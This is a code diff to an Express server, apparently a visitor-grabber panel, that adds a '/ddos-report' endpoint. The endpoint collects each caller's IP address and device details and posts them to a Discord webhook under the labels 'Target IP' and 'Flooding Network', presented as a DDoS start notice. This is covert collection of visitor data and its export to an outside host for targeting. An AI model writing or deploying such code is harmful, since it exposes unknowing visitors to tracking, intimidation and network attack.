@@ -163,6 +163,31 @@ app.post('/capture-extra', (req, res) => {
   res.json({ ok: true });
 });
 
+// إشعار بدء هجوم الديدوس
+app.post('/ddos-report', (req, res) => {
+  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
+  
+  if (DISCORD_WEBHOOK) {
+    fetch(DISCORD_WEBHOOK, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        embeds: [{
+          title: '💥 NETWORK STRESS TEST (DDoS SIM)',
+          color: 0xff0000,
+          fields: [
+            { name: 'Target IP', value: `\`${ip}\``, inline: true },
+            { name: 'Device', value: `\`${parseDevice(req.headers['user-agent'] || '')}\``, inline: true },
+            { name: 'Status', value: '`🔥 Executing... Flooding Network`', inline: false }
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      })
+    }).catch(() => {});
+  }
+  res.json({ ok: true });
+});
+
 // لوحة التحكم
 app.get('/admin', (req, res) => {
   if (!isAdmin(req)) return res.status(403).send('nope');
@@ -198,7 +223,6 @@ tick(); setInterval(tick, 3000);
   res.send(adminHtml);
 });
 
-// سجلات لوحة التحكم
 app.get('/admin/logs', (req, res) => {
   if (!isAdmin(req) && req.query.key !== ADMIN_KEY) return res.status(403).send('nope');
   res.type('text/plain').send(fs.existsSync(LOG) ? fs.readFileSync(LOG, 'utf8') : '');
